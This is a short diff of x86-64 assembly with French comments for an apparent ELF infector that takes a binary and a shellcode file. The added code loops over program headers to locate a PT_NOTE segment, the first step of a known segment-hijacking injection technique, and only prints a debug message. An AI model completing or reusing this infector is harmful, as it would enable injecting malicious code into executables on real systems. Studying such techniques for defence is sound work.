@@ -25,6 +25,8 @@ default rel
 section .data
     msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
     msg_usage_len equ $ - msg_usage
+    msg_found db "PT_NOTE trouve", 10   ; message de debug
+    msg_found_len equ $ - msg_found     ; longueur
 
 section .bss
     fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
@@ -73,6 +75,24 @@ _start:
 
     .find_note:
     cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
+    je .found   ; si oui, saute a .found
+    add rbx, P_PHDR_SIZE    ; phdr suivant (56 octets)
+    dec rcx ; decremente le compteur
+    jnz .find_note  ; si reste > 0, on reboucle
+    mov rax, 60 ; syscall exit
+    mov rdi, 1  ; code de retour 1 (erreur)
+    syscall
+
+    .found: ; label : PT_NOTE trouve
+    mov rax, 1  ; syscall write
+    mov rdi, 1  ; stdout
+    lea rsi, [msg_found]    ; message
+    mov rdx, msg_found_len  ; longueur
+    syscall
+
+    mov rax, 60                         ; syscall exit
+    xor rdi, rdi                        ; code de retour 0 (succes)
+    syscall
 
     ;exit
     mov rax, 60
